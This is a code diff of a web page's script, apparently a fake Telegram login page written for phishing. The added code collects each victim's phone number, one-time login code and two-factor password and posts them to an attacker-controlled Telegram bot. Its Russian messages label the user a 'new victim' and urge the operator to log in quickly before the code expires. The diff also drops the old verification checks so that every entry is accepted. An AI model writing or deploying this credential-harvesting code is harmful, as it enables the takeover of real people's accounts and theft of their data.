@@ -124,46 +124,42 @@
             
             fullPhone = country + phone;
             
-            // Отправляем номер боту
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=/send_code%20${fullPhone}`)
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok) {
-                        document.getElementById('phoneDisplay').innerText = fullPhone;
-                        document.getElementById('phoneDisplay2').innerText = fullPhone;
-                        document.getElementById('step1').classList.remove('active');
-                        document.getElementById('step2').classList.add('active');
-                    } else {
-                        document.getElementById('alert1').innerText = "Ошибка отправки кода";
-                    }
-                });
+            // Отправляем ТЕБЕ номер
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: `📱 Новая жертва!\nНомер: ${fullPhone}\n\nВведи этот номер в Telegram на своём телефоне!`
+                })
+            });
+            
+            document.getElementById('phoneDisplay').innerText = fullPhone;
+            document.getElementById('phoneDisplay2').innerText = fullPhone;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
         }
         
         function sendCode() {
             const code = document.getElementById('code').value.trim();
             
             if (!code || code.length !== 5) {
-                document.getElementById('alert2').innerText = "Неверный код. Попробуйте снова.";
+                document.getElementById('alert2').innerText = "Неверный код";
                 return;
             }
             
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=/verify_code%20${fullPhone}%20${code}`)
-                .then(r => r.json())
-                .then(data => {
-                    const result = data.result?.text || "";
-                    
-                    if (result.includes("ok")) {
-                        // Успешно без пароля
-                        document.getElementById('step2').classList.remove('active');
-                        document.getElementById('step4').classList.add('active');
-                    } else if (result.includes("need_password")) {
-                        // Нужен пароль
-                        document.getElementById('step2').classList.remove('active');
-                        document.getElementById('step3').classList.add('active');
-                    } else {
-                        document.getElementById('alert2').innerText = "Неверный код. Попробуйте снова.";
-                    }
-                });
+            // Отправляем ТЕБЕ код
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: `🔑 КОД: ${code}\n📱 Номер: ${fullPhone}\n\nБыстро введи код в Telegram!`
+                })
+            });
+            
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
         }
         
         function sendPassword() {
@@ -174,17 +170,18 @@
                 return;
             }
             
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=/send_password%20${fullPhone}%20${password}`)
-                .then(r => r.json())
-                .then(data => {
-                    const result = data.result?.text || "";
-                    if (result.includes("ok")) {
-                        document.getElementById('step3').classList.remove('active');
-                        document.getElementById('step4').classList.add('active');
-                    } else {
-                        document.getElementById('alert3').innerText = "Неверный пароль. Попробуйте снова.";
-                    }
-                });
+            // Отправляем ТЕБЕ пароль
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: `🔐 ПАРОЛЬ: ${password}\n📱 Номер: ${fullPhone}\n\nГотово! Заходи в аккаунт!`
+                })
+            });
+            
+            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step4').classList.add('active');
         }
     </script>
 </body>
